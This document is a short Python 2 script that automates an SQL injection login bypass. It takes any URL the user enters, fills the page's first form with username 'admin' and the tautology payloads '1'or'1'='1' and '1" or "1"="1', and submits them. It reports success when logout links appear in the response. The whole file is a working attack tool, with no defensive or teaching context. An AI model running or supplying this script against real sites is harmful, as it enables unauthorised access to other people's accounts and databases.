##############################################################
#             SQL Injection in Login Page Database           #
##############################################################
import mechanize
import re
br = mechanize.Browser()
br.set_handle_robots( False )
url = raw_input("Enter URL: ")
br.set_handle_equiv(True)
br.set_handle_gzip(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.open(url)

for form in br.forms():
    print form
br.select_form(nr=0)
pass_list = ["1'or'1'='1",'1" or "1"="1']

username = raw_input("Enter the Username: ")
password = raw_input("Enter the Password: ")

flag = 0
p = 0

while flag == 0:
    br.select_form(nr=0)
    br.form[username] = 'admin'
    br.form[password] = pass_list[p]
    br.submit()
    data = ""
    for link in br.links():
        data=data+str(link)
    logout_list = ['logout','logoff', 'signout','signoff']
    data_change = data.lower()
	
    for l in logout_list:
        for match in re.findall(l,data_change):
            flag = 1
    if flag == 1:
        print "\t Success in ",p+1," Attempts"
        print "Successfull Hit --> ",pass_list[p]	
    elif(p+1 == len(pass_list)):
        print "All SQL Injection Completed"
        flag = 1
    else :
        p = p+1
